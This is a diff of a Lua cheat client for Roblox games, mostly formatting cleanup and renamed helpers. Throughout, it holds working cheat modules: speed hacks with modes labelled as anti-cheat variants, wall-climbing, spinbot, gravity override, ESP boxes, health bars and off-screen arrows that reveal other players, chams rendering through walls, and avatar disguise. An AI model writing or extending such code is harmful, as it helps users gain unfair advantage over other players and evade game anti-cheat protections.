 	SpiderMode = Spider.CreateDropdown({
 		Name = "Mode",
 		List = {"Normal", "CFrame", "Classic"},
-		Function = function(val) 
+		Function = function(val)
 			if SpiderPart then SpiderPart:Destroy() SpiderPart = nil end
-			if val == "Classic" then 
+			if val == "Classic" then
 				SpiderPart = Instance.new("TrussPart")
 				SpiderPart.Size = Vector3.new(2, 2, 2)
 				SpiderPart.Transparency = 1
@@ -2133,7 +2450,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local Speed = {Enabled = false}
 	local SpeedValue = {Value = 1}
 	local SpeedMethod = {Value = "AntiCheat A"}
@@ -2160,7 +2477,7 @@ runFunction(function()
 
 	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B", "AntiCheat C", "AntiCheat D"}
 	Speed = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-		Name = "Speed", 
+		Name = "Speed",
 		Function = function(callback)
 			if callback then
 				w = inputService:IsKeyDown(Enum.KeyCode.W) and -1 or 0
@@ -2236,11 +2553,11 @@ runFunction(function()
 								end
 								entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + newpos
 							end
-						elseif SpeedMethod.Value == "Pulse" then 
+						elseif SpeedMethod.Value == "Pulse" then
 							local pulsenum = (SpeedPulseDuration.Value / 100)
 							local newvelo = movevec * (SpeedValue.Value + (entityLibrary.character.Humanoid.WalkSpeed - SpeedValue.Value) * (1 - (math.max(pulsetick - tick(), 0)) / pulsenum))
 							entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(newvelo.X, entityLibrary.character.HumanoidRootPart.Velocity.Y, newvelo.Z)
-						elseif SpeedMethod.Value == "WalkSpeed" then 
+						elseif SpeedMethod.Value == "WalkSpeed" then
 							if oldWalkSpeed == nil then
 								oldWalkSpeed = entityLibrary.character.Humanoid.WalkSpeed
 							end
@@ -2248,7 +2565,7 @@ runFunction(function()
 						end
 						if SpeedJump.Enabled and (SpeedJumpAlways.Enabled or KillauraNearTarget) then
 							if (entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air) and entityLibrary.character.Humanoid.MoveDirection ~= Vector3.zero then
-								if SpeedJumpVanilla.Enabled then 
+								if SpeedJumpVanilla.Enabled then
 									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
 								else
 									entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(entityLibrary.character.HumanoidRootPart.Velocity.X, SpeedJumpHeight.Value, entityLibrary.character.HumanoidRootPart.Velocity.Z)
@@ -2266,15 +2583,15 @@ runFunction(function()
 				RunLoops:UnbindFromHeartbeat("Speed")
 			end
 		end,
-		ExtraText = function() 
-			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"].Api.Enabled then 
+		ExtraText = function()
+			if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"].Api.Enabled then
 				return alternatelist[table.find(SpeedMethod.List, SpeedMethod.Value)]
 			end
 			return SpeedMethod.Value
 		end
 	})
 	SpeedMethod = Speed.CreateDropdown({
-		Name = "Mode", 
+		Name = "Mode",
 		List = {"Velocity", "CFrame", "TP", "Pulse", "WalkSpeed"},
 		Function = function(val)
 			if oldWalkSpeed then
@@ -2288,20 +2605,20 @@ runFunction(function()
 		end
 	})
 	SpeedMoveMethod = Speed.CreateDropdown({
-		Name = "Movement", 
+		Name = "Movement",
 		List = {"Manual", "MoveDirection"},
 		Function = function(val) end
 	})
 	SpeedValue = Speed.CreateSlider({
-		Name = "Speed", 
+		Name = "Speed",
 		Min = 1,
-		Max = 150, 
+		Max = 150,
 		Function = function(val) end
 	})
 	SpeedDelay = Speed.CreateSlider({
-		Name = "Delay", 
+		Name = "Delay",
 		Min = 1,
-		Max = 50, 
+		Max = 50,
 		Function = function(val)
 			SpeedDelayTick = tick() + (val / 10)
 		end,
@@ -2317,8 +2634,8 @@ runFunction(function()
 		Double = 100
 	})
 	SpeedJump = Speed.CreateToggle({
-		Name = "AutoJump", 
-		Function = function(callback) 
+		Name = "AutoJump",
+		Function = function(callback)
 			if SpeedJumpHeight.Object then SpeedJumpHeight.Object.Visible = callback end
 			if SpeedJumpAlways.Object then
 				SpeedJump.Object.ToggleArrow.Visible = callback
@@ -2354,7 +2671,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local SpinBot = {Enabled = false}
 	local SpinBotX = {Enabled = false}
 	local SpinBotY = {Enabled = false}
@@ -2399,7 +2716,7 @@ runFunction(function()
 end)
 
 local GravityChangeTick = tick()
-runFunction(function()
+run(function()
 	local Gravity = {Enabled = false}
 	local GravityValue = {Value = 100}
 	local oldGravity
@@ -2410,7 +2727,7 @@ runFunction(function()
 				oldGravity = workspace.Gravity
 				workspace.Gravity = GravityValue.Value
 				table.insert(Gravity.Connections, workspace:GetPropertyChangedSignal("Gravity"):Connect(function()
-					if GravityChangeTick > tick() then return end 
+					if GravityChangeTick > tick() then return end
 					oldGravity = workspace.Gravity
 					GravityChangeTick = tick() + 0.1
 					workspace.Gravity = GravityValue.Value
@@ -2425,7 +2742,7 @@ runFunction(function()
 		Name = "Gravity",
 		Min = 0,
 		Max = 192,
-		Function = function(val) 
+		Function = function(val)
 			if Gravity.Enabled then
 				GravityChangeTick = tick() + 0.1
 				workspace.Gravity = val
@@ -2435,7 +2752,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
     local ArrowsFolder = Instance.new("Folder")
     ArrowsFolder.Name = "ArrowsFolder"
     ArrowsFolder.Parent = GuiLibrary.MainGui
@@ -2467,15 +2784,15 @@ runFunction(function()
 
     local arrowColorFunction = function(hue, sat, val)
         local color = Color3.fromHSV(hue, sat, val)
-        for i,v in pairs(ArrowsFolderTable) do 
+        for i,v in pairs(ArrowsFolderTable) do
             v.Main.ImageColor3 = getPlayerColor(v.entity.Player) or color
         end
     end
 
     local arrowLoopFunction = function()
-        for i,v in pairs(ArrowsFolderTable) do 
+        for i,v in pairs(ArrowsFolderTable) do
             local rootPos, rootVis = worldtoscreenpoint(v.entity.RootPart.Position)
-            if rootVis then 
+            if rootVis then
                 v.Main.Visible = false
                 continue
             end
@@ -2490,11 +2807,11 @@ runFunction(function()
 
     local Arrows = {Enabled = false}
 	Arrows = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-        Name = "Arrows", 
-        Function = function(callback) 
+        Name = "Arrows",
+        Function = function(callback)
             if callback then
 				table.insert(Arrows.Connections, entityLibrary.entityRemovedEvent:Connect(arrowRemoveFunction))
-				for i,v in pairs(entityLibrary.entityList) do 
+				for i,v in pairs(entityLibrary.entityList) do
                     if ArrowsFolderTable[v.Player] then arrowRemoveFunction(v.Player) end
                     arrowAddFunction(v)
                 end
@@ -2507,18 +2824,18 @@ runFunction(function()
                 end))
 				RunLoops:BindToRenderStep("Arrows", arrowLoopFunction)
             else
-                RunLoops:UnbindFromRenderStep("Arrows") 
-				for i,v in pairs(ArrowsFolderTable) do 
+                RunLoops:UnbindFromRenderStep("Arrows")
+				for i,v in pairs(ArrowsFolderTable) do
                     arrowRemoveFunction(i)
                 end
             end
-        end, 
+        end,
         HoverText = "Draws arrows on screen when entities\nare out of your field of view."
     })
     ArrowsColor = Arrows.CreateColorSlider({
-        Name = "Player Color", 
-        Function = function(hue, sat, val) 
-			if Arrows.Enabled then 
+        Name = "Player Color",
+        Function = function(hue, sat, val)
+			if Arrows.Enabled then
 				arrowColorFunction(hue, sat, val)
 			end
 		end,
@@ -2531,11 +2848,11 @@ runFunction(function()
 end)
 
 
-runFunction(function()
+run(function()
 	local Disguise = {Enabled = false}
 	local DisguiseId = {Value = ""}
 	local DisguiseDescription
-	
+
 	local function Disguisechar(char)
 		task.spawn(function()
 			if not char then return end
@@ -2559,47 +2876,47 @@ runFunction(function()
 			local Disguiseclone = char:Clone()
 			Disguiseclone.Name = "Disguisechar"
 			Disguiseclone.Parent = workspace
-			for i,v in pairs(Disguiseclone:GetChildren()) do 
-				if v:IsA("Accessory") or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") then  
+			for i,v in pairs(Disguiseclone:GetChildren()) do
+				if v:IsA("Accessory") or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") then
 					v:Destroy()
 				end
 			end
-			if not Disguiseclone:FindFirstChildWhichIsA("Humanoid") then 
+			if not Disguiseclone:FindFirstChildWhichIsA("Humanoid") then
 				Disguiseclone:Destroy()
-				return 
+				return
 			end
 			Disguiseclone.Humanoid:ApplyDescriptionClientServer(DisguiseDescription)
-			for i,v in pairs(char:GetChildren()) do 
-				if (v:IsA("Accessory") and v:GetAttribute("InvItem") == nil and v:GetAttribute("ArmorSlot") == nil) or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") or v:IsA("Folder") or v:IsA("Model") then 
+			for i,v in pairs(char:GetChildren()) do
+				if (v:IsA("Accessory") and v:GetAttribute("InvItem") == nil and v:GetAttribute("ArmorSlot") == nil) or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") or v:IsA("Folder") or v:IsA("Model") then
 					v.Parent = game
 				end
 			end
 			char.ChildAdded:Connect(function(v)
-				if ((v:IsA("Accessory") and v:GetAttribute("InvItem") == nil and v:GetAttribute("ArmorSlot") == nil) or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors")) and v:GetAttribute("Disguise") == nil then 
+				if ((v:IsA("Accessory") and v:GetAttribute("InvItem") == nil and v:GetAttribute("ArmorSlot") == nil) or v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors")) and v:GetAttribute("Disguise") == nil then
 					repeat task.wait() v.Parent = game until v.Parent == game
 				end
 			end)
-			for i,v in pairs(Disguiseclone:WaitForChild("Animate"):GetChildren()) do 
+			for i,v in pairs(Disguiseclone:WaitForChild("Animate"):GetChildren()) do
 				v:SetAttribute("Disguise", true)
 				if not char:FindFirstChild("Animate") then return end
 				local real = char.Animate:FindFirstChild(v.Name)
-				if v:IsA("StringValue") and real then 
+				if v:IsA("StringValue") and real then
 					real.Parent = game
 					v.Parent = char.Animate
 				end
 			end
-			for i,v in pairs(Disguiseclone:GetChildren()) do 
+			for i,v in pairs(Disguiseclone:GetChildren()) do
 				v:SetAttribute("Disguise", true)
-				if v:IsA("Accessory") then  
-					for i2,v2 in pairs(v:GetDescendants()) do 
-						if v2:IsA("Weld") and v2.Part1 then 
+				if v:IsA("Accessory") then
+					for i2,v2 in pairs(v:GetDescendants()) do
+						if v2:IsA("Weld") and v2.Part1 then
 							v2.Part1 = char[v2.Part1.Name]
 						end
 					end
 					v.Parent = char
-				elseif v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then  
+				elseif v:IsA("ShirtGraphic") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
 					v.Parent = char
-				elseif v.Name == "Head" and char.Head:IsA("MeshPart") then 
+				elseif v.Name == "Head" and char.Head:IsA("MeshPart") then
 					char.Head.MeshId = v.MeshId
 				end
 			end
@@ -2615,7 +2932,7 @@ runFunction(function()
 	Disguise = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
 		Name = "Disguise",
 		Function = function(callback)
-			if callback then 
+			if callback then
 				table.insert(Disguise.Connections, lplr.CharacterAdded:Connect(Disguisechar))
 				Disguisechar(lplr.Character)
 			end
@@ -2624,8 +2941,8 @@ runFunction(function()
 	DisguiseId = Disguise.CreateTextBox({
 		Name = "Disguise",
 		TempText = "Disguise User Id",
-		FocusLost = function(enter) 
-			if Disguise.Enabled then 
+		FocusLost = function(enter)
+			if Disguise.Enabled then
 				Disguise.ToggleButton(false)
 				Disguise.ToggleButton(false)
 			end
@@ -2633,7 +2950,7 @@ runFunction(function()
 	})
 end)
 
-runFunction(function()
+run(function()
 	local ESPColor = {Value = 0.44}
 	local ESPHealthBar = {Enabled = false}
 	local ESPBoundingBox = {Enabled = true}
@@ -2675,7 +2992,7 @@ runFunction(function()
 			thing.QuadLine3.Thickness = 1
 			thing.QuadLine3.Filled = false
 			thing.QuadLine3.Color = Color3.new()
-			if ESPHealthBar.Enabled then 
+			if ESPHealthBar.Enabled then
 				thing.Quad3 = Drawing.new("Line")
 				thing.Quad3.Thickness = 1
 				thing.Quad3.ZIndex = 2
@@ -2686,10 +3003,10 @@ runFunction(function()
 				thing.Quad4.ZIndex = 1
 				thing.Quad4.Color = Color3.new()
 			end
-			if ESPName.Enabled then 
+			if ESPName.Enabled then
 				thing.Drop = Drawing.new("Text")
 				thing.Drop.Color = Color3.new()
-				thing.Drop.Text = WhitelistFunctions:GetTag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
+				thing.Drop.Text = whitelist:tag(plr.Player, true)..(plr.Player.DisplayName or plr.Player.Name)
 				thing.Drop.ZIndex = 1
 				thing.Drop.Center = true
 				thing.Drop.Size = 20
@@ -2714,7 +3031,7 @@ runFunction(function()
 			newobj.Color = getPlayerColor(plr.Player) or Color3.fromHSV(ESPColor.Hue, ESPColor.Sat, ESPColor.Value)
 			local newobj2 = {}
 			local newobj3 = {}
-			if ESPHealthBar.Enabled then 
+			if ESPHealthBar.Enabled then
 				local topoffset = PointOffset.new(PointInstance.new(plr.RootPart, CFrame.new(-2, 3, 0)), Vector2.new(-5, -1))
 				local bottomoffset = PointOffset.new(PointInstance.new(plr.RootPart, CFrame.new(-2, -3.5, 0)), Vector2.new(-3, 1))
 				local healthoffset = PointOffset.new(bottomoffset, Vector2.new(0, -1))
@@ -2732,11 +3049,11 @@ runFunction(function()
 				newobj2.TopOffset = topoffset
 				newobj2.BottomOffset = bottomoffset
 			end
-			if ESPName.Enabled then 
+			if ESPName.Enabled then
 				local nameoffset1 = PointOffset.new(PointInstance.new(plr.RootPart, CFrame.new(0, 3, 0)), Vector2.new(0, -15))
 				local nameoffset2 = PointOffset.new(nameoffset1, Vector2.new(1, 1))
 				newobj3.Text = TextDynamic.new(nameoffset1)
-				newobj3.Text.Text = WhitelistFunctions:GetTag(plr.Player)..(plr.Player.DisplayName or plr.Player.Name)
+				newobj3.Text.Text = whitelist:tag(plr.Player, true)..(plr.Player.DisplayName or plr.Player.Name)
 				newobj3.Text.Color = newobj.Color
 				newobj3.Text.ZIndex = 2
 				newobj3.Text.Size = 20
@@ -2864,7 +3181,7 @@ runFunction(function()
 		Drawing2D = function(ent)
 			local v = espfolderdrawing[ent]
 			espfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				for i2,v2 in pairs(v.Main) do
 					pcall(function() v2.Visible = false v2:Remove() end)
 				end
@@ -2876,12 +3193,12 @@ runFunction(function()
 			if v then
 				v.Main.Visible = false
 				for i2,v2 in pairs(v.HealthBar) do
-					if typeof(v2):find("Point") == nil then 
+					if typeof(v2):find("Point") == nil then
 						v2.Visible = false
 					end
 				end
 				for i2,v2 in pairs(v.Name) do
-					if typeof(v2):find("Point") == nil then 
+					if typeof(v2):find("Point") == nil then
 						v2.Visible = false
 					end
 				end
@@ -2890,7 +3207,7 @@ runFunction(function()
 		Drawing3D = function(ent)
 			local v = espfolderdrawing[ent]
 			espfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				for i2,v2 in pairs(v.Main) do
 					pcall(function() v2.Visible = false v2:Remove() end)
 				end
@@ -2901,7 +3218,7 @@ runFunction(function()
 			espfolderdrawing[ent] = nil
 			if v then
 				for i2,v2 in pairs(v.Main) do
-					if typeof(v2):find("Dynamic") then 
+					if typeof(v2):find("Dynamic") then
 						v2.Visible = false
 					end
 				end
@@ -2910,7 +3227,7 @@ runFunction(function()
 		DrawingSkeleton = function(ent)
 			local v = espfolderdrawing[ent]
 			espfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				for i2,v2 in pairs(v.Main) do
 					pcall(function() v2.Visible = false v2:Remove() end)
 				end
@@ -2919,9 +3236,9 @@ runFunction(function()
 		DrawingSkeletonV3 = function(ent)
 			local v = espfolderdrawing[ent]
 			espfolderdrawing[ent] = nil
-			if v then 
+			if v then
 				for i2,v2 in pairs(v.Main) do
-					if typeof(v2):find("Dynamic") then 
+					if typeof(v2):find("Dynamic") then
 						v2.Visible = false
 					end
 				end
@@ -2931,24 +3248,24 @@ runFunction(function()
 	local espupdatefuncs = {
 		Drawing2D = function(ent)
 			local v = espfolderdrawing[ent.Player]
-			if v and v.Main.Quad3 then 
+			if v and v.Main.Quad3 then
 				local color = Color3.fromHSV(math.clamp(ent.Humanoid.Health / ent.Humanoid.MaxHealth, 0, 1) / 2.5, 0.89, 1)
 				v.Main.Quad3.Color = color
 			end
-			if v and v.Text then 
-				v.Text.Text = WhitelistFunctions:GetTag(ent.Player)..(ent.Player.DisplayName or ent.Player.Name)
+			if v and v.Text then
+				v.Text.Text = whitelist:tag(ent.Player, true)..(ent.Player.DisplayName or ent.Player.Name)
 				v.Drop.Text = v.Text.Text
 			end
 		end,
 		Drawing2DV3 = function(ent)
 			local v = espfolderdrawing[ent.Player]
-			if v and v.HealthBar.Line then 
+			if v and v.HealthBar.Line then
 				local health = ent.Humanoid.Health / ent.Humanoid.MaxHealth
 				local color = Color3.fromHSV(math.clamp(health, 0, 1) / 2.5, 0.89, 1)
 				v.HealthBar.Line.Color = color
 			end
-			if v and v.Name and v.Name.Text then 
-				v.Name.Text.Text = WhitelistFunctions:GetTag(ent.Player)..(ent.Player.DisplayName or ent.Player.Name)
+			if v and v.Name and v.Name.Text then
+				v.Name.Text.Text = whitelist:tag(ent.Player, true)..(ent.Player.DisplayName or ent.Player.Name)
 				v.Name.Drop.Text = v.Name.Text.Text
 			end
 		end
@@ -2956,25 +3273,25 @@ runFunction(function()
 	local espcolorfuncs = {
 		Drawing2D = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				v.Main.Quad1.Color = getPlayerColor(v.entity.Player) or color
-				if v.Main.Text then 
+				if v.Main.Text then
 					v.Main.Text.Color = v.Main.Quad1.Color
 				end
 			end
 		end,
 		Drawing2DV3 = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				v.Main.Color = getPlayerColor(v.entity.Player) or color
-				if v.Name.Text then 
+				if v.Name.Text then
 					v.Name.Text.Color = v.Main.Color
 				end
 			end
 		end,
 		Drawing3D = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local newcolor = getPlayerColor(v.entity.Player) or color
 				for i2,v2 in pairs(v.Main) do
 					v2.Color = newcolor
@@ -2983,10 +3300,10 @@ runFunction(function()
 		end,
 		Drawing3DV3 = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local newcolor = getPlayerColor(v.entity.Player) or color
 				for i2,v2 in pairs(v.Main) do
-					if typeof(v2):find("Dynamic") then 
+					if typeof(v2):find("Dynamic") then
 						v2.Color = newcolor
 					end
 				end
@@ -2994,7 +3311,7 @@ runFunction(function()
 		end,
 		DrawingSkeleton = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local newcolor = getPlayerColor(v.entity.Player) or color
 				for i2,v2 in pairs(v.Main) do
 					v2.Color = newcolor
@@ -3003,10 +3320,10 @@ runFunction(function()
 		end,
 		DrawingSkeletonV3 = function(hue, sat, value)
 			local color = Color3.fromHSV(hue, sat, value)
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local newcolor = getPlayerColor(v.entity.Player) or color
 				for i2,v2 in pairs(v.Main) do
-					if typeof(v2):find("Dynamic") then 
+					if typeof(v2):find("Dynamic") then
 						v2.Color = newcolor
 					end
 				end
@@ -3015,21 +3332,21 @@ runFunction(function()
 	}
 	local esploop = {
 		Drawing2D = function()
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local rootPos, rootVis = worldtoviewportpoint(v.entity.RootPart.Position)
-				if not rootVis then 
+				if not rootVis then
 					v.Main.Quad1.Visible = false
 					v.Main.QuadLine2.Visible = false
 					v.Main.QuadLine3.Visible = false
-					if v.Main.Quad3 then 
+					if v.Main.Quad3 then
 						v.Main.Quad3.Visible = false
 						v.Main.Quad4.Visible = false
 					end
-					if v.Main.Text then 
+					if v.Main.Text then
 						v.Main.Text.Visible = false
 						v.Main.Drop.Visible = false
 					end
-					continue 
+					continue
 				end
 				local topPos, topVis = worldtoviewportpoint((CFrame.new(v.entity.RootPart.Position, v.entity.RootPart.Position + gameCamera.CFrame.lookVector) * CFrame.new(2, 3, 0)).p)
 				local bottomPos, bottomVis = worldtoviewportpoint((CFrame.new(v.entity.RootPart.Position, v.entity.RootPart.Position + gameCamera.CFrame.lookVector) * CFrame.new(-2, -3.5, 0)).p)
@@ -3044,7 +3361,7 @@ runFunction(function()
 				v.Main.QuadLine3.Position = floorESPPosition(Vector2.new(posx + 1, posy - 1))
 				v.Main.QuadLine3.Size = floorESPPosition(Vector2.new(sizex - 2, sizey + 2))
 				v.Main.QuadLine3.Visible = true
-				if v.Main.Quad3 then 
+				if v.Main.Quad3 then
 					local healthposy = sizey * math.clamp(v.entity.Humanoid.Health / v.entity.Humanoid.MaxHealth, 0, 1)
 					v.Main.Quad3.Visible = v.entity.Humanoid.Health > 0
 					v.Main.Quad3.From = floorESPPosition(Vector2.new(posx - 4, posy + (sizey - (sizey - healthposy))))
@@ -3053,7 +3370,7 @@ runFunction(function()
 					v.Main.Quad4.From = floorESPPosition(Vector2.new(posx - 4, posy))
 					v.Main.Quad4.To = floorESPPosition(Vector2.new(posx - 4, (posy + sizey)))
 				end
-				if v.Main.Text then 
+				if v.Main.Text then
 					v.Main.Text.Visible = true
 					v.Main.Drop.Visible = true
 					v.Main.Text.Position = floorESPPosition(Vector2.new(posx + (sizex / 2), posy + (sizey - 25)))
@@ -3062,23 +3379,23 @@ runFunction(function()
 			end
 		end,
 		Drawing2DV3 = function()
-			for i,v in pairs(espfolderdrawing) do 
-				if v.HealthBar.Offset then 
+			for i,v in pairs(espfolderdrawing) do
+				if v.HealthBar.Offset then
 					v.HealthBar.Offset.Offset = Vector2.new(-1, -(((v.HealthBar.BottomOffset.ScreenPos.Y - v.HealthBar.TopOffset.ScreenPos.Y) - 1) * (v.entity.Humanoid.Health / v.entity.Humanoid.MaxHealth)))
 					v.HealthBar.Line.Visible = v.entity.Humanoid.Health > 0
 				end
 			end
 		end,
 		Drawing3D = function()
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local rootPos, rootVis = worldtoviewportpoint(v.entity.RootPart.Position)
-				if not rootVis then 
-					for i,v in pairs(v.Main) do 
+				if not rootVis then
+					for i,v in pairs(v.Main) do
 						v.Visible = false
 					end
-					continue 
+					continue
 				end
-				for i,v in pairs(v.Main) do 
+				for i,v in pairs(v.Main) do
 					v.Visible = true
 				end
 				local point1 = ESPWorldToViewport(v.entity.RootPart.Position + Vector3.new(1.5, 3, 1.5))
@@ -3116,15 +3433,15 @@ runFunction(function()
 			end
 		end,
 		DrawingSkeleton = function()
-			for i,v in pairs(espfolderdrawing) do 
+			for i,v in pairs(espfolderdrawing) do
 				local rootPos, rootVis = worldtoviewportpoint(v.entity.RootPart.Position)
-				if not rootVis then 
-					for i,v in pairs(v.Main) do 
+				if not rootVis then
+					for i,v in pairs(v.Main) do
 						v.Visible = false
 					end
-					continue 
+					continue
 				end
-				for i,v in pairs(v.Main) do 
+				for i,v in pairs(v.Main) do
 					v.Visible = true
 				end
 				local rigcheck = v.entity.Humanoid.RigType == Enum.HumanoidRigType.R6
@@ -3164,8 +3481,8 @@ runFunction(function()
 
 	local ESP = {Enabled = false}
 	ESP = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "ESP", 
-		Function = function(callback) 
+		Name = "ESP",
+		Function = function(callback)
 			if callback then
 				methodused = "Drawing"..ESPMethod.Value..synapsev3
 				if espfuncs2[methodused] then
@@ -3173,7 +3490,7 @@ runFunction(function()
 				end
 				if espfuncs1[methodused] then
 					local addfunc = espfuncs1[methodused]
-					for i,v in pairs(entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do
 						if espfolderdrawing[v.Player] then espfuncs2[methodused](v.Player) end
 						addfunc(v)
 					end
@@ -3184,22 +3501,22 @@ runFunction(function()
 				end
 				if espupdatefuncs[methodused] then
 					table.insert(ESP.Connections, entityLibrary.entityUpdatedEvent:Connect(espupdatefuncs[methodused]))
-					for i,v in pairs(entityLibrary.entityList) do 
+					for i,v in pairs(entityLibrary.entityList) do
 						espupdatefuncs[methodused](v)
 					end
 				end
-				if espcolorfuncs[methodused] then 
+				if espcolorfuncs[methodused] then
 					table.insert(ESP.Connections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendColorRefresh.Event:Connect(function()
 						espcolorfuncs[methodused](ESPColor.Hue, ESPColor.Sat, ESPColor.Value)
 					end))
 				end
-				if esploop[methodused] then 
+				if esploop[methodused] then
 					RunLoops:BindToRenderStep("ESP", esploop[methodused])
 				end
 			else
 				RunLoops:UnbindFromRenderStep("ESP")
 				if espfuncs2[methodused] then
-					for i,v in pairs(espfolderdrawing) do 
+					for i,v in pairs(espfolderdrawing) do
 						espfuncs2[methodused](i)
 					end
 				end
@@ -3208,9 +3525,9 @@ runFunction(function()
 		HoverText = "Extra Sensory Perception\nRenders an ESP on players."
 	})
 	ESPColor = ESP.CreateColorSlider({
-		Name = "Player Color", 
-		Function = function(hue, sat, val) 
-			if ESP.Enabled and espcolorfuncs[methodused] then 
+		Name = "Player Color",
+		Function = function(hue, sat, val)
+			if ESP.Enabled and espcolorfuncs[methodused] then
 				espcolorfuncs[methodused](hue, sat, val)
 			end
 		end
@@ -3236,17 +3553,17 @@ runFunction(function()
 		Default = true
 	})
 	ESPHealthBar = ESP.CreateToggle({
-		Name = "Health Bar", 
+		Name = "Health Bar",
 		Function = function(callback) if ESP.Enabled then ESP.ToggleButton(true) ESP.ToggleButton(true) end end
 	})
 	ESPName = ESP.CreateToggle({
-		Name = "Name", 
+		Name = "Name",
 		Function = function(callback) if ESP.Enabled then ESP.ToggleButton(true) ESP.ToggleButton(true) end end
 	})
 end)
 
 
-runFunction(function()
+run(function()
 	local ChamsFolder = Instance.new("Folder")
 	ChamsFolder.Name = "ChamsFolder"
 	ChamsFolder.Parent = GuiLibrary.MainGui
@@ -3282,11 +3599,11 @@ runFunction(function()
 
 	local Chams = {Enabled = false}
 	Chams = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-		Name = "Chams", 
-		Function = function(callback) 
+		Name = "Chams",
+		Function = function(callback)
 			if callback then
 				table.insert(Chams.Connections, entityLibrary.entityRemovedEvent:Connect(removefunc))
-				for i,v in pairs(entityLibrary.entityList) do 
+				for i,v in pairs(entityLibrary.entityList) do
 					if chamstable[v.Player] then removefunc(v.Player) end
 					addfunc(v)
 				end
@@ -3295,13 +3612,13 @@ runFunction(function()
 					addfunc(ent)
 				end))
 				table.insert(Chams.Connections, GuiLibrary.ObjectsThatCanBeSaved.FriendsListTextCircleList.Api.FriendColorRefresh.Event:Connect(function()
-					for i,v in pairs(chamstable) do 
+					for i,v in pairs(chamstable) do
 						v.Main.FillColor = getPlayerColor(i) or Color3.fromHSV(ChamsColor.Hue, ChamsColor.Sat, ChamsColor.Value)
 						v.Main.OutlineColor = getPlayerColor(i) or Color3.fromHSV(ChamsOutlineColor.Hue, ChamsOutlineColor.Sat, ChamsOutlineColor.Value)
 					end
 				end))
 			else
-				for i,v in pairs(chamstable) do 
+				for i,v in pairs(chamstable) do
 					removefunc(i)
 				end
 			end
@@ -3309,32 +3626,32 @@ runFunction(function()
 		HoverText = "Render players through walls"
 	})
 	ChamsColor = Chams.CreateColorSlider({
-		Name = "Player Color", 
-		Function = function(val) 
-			for i,v in pairs(chamstable) do 
+		Name = "Player Color",
+		Function = function(val)
+			for i,v in pairs(chamstable) do
 				v.Main.FillColor = getPlayerColor(i) or Color3.fromHSV(ChamsColor.Hue, ChamsColor.Sat, ChamsColor.Value)
 			end
 		end
 	})
 	ChamsOutlineColor = Chams.CreateColorSlider({
-		Name = "Outline Player Color", 
+		Name = "Outline Player Color",
 		Function = function(val)
-			for i,v in pairs(chamstable) do 
+			for i,v in pairs(chamstable) do
 				v.Main.OutlineColor = getPlayerColor(i) or Color3.fromHSV(ChamsOutlineColor.Hue, ChamsOutlineColor.Sat, ChamsOutlineColor.Value)
 			end
 		end
 	})
 	ChamsTransparency = Chams.CreateSlider({
-		Name = "Transparency", 
+		Name = "Transparency",
 		Min = 1,
-		Max = 100, 
+		Max = 100,
 		Function = function(callback) if Chams.Enabled then Chams.ToggleButton(true) Chams.ToggleButton(true) end end,
 		Default = 50
 	})
 	ChamsOutlineTransparency = Chams.CreateSlider({
-		Name = "Outline Transparency", 
+		Name = "Outline Transparency",
 		Min = 1,
-		Max = 100, 
+		Max = 100,
 		Function = function(callback) if Chams.Enabled then Chams.ToggleButton(true) Chams.ToggleButton(true) end end,
 		Default = 1
 	})
@@ -3344,19 +3661,19 @@ runFunction(function()
 		Default = true
 	})
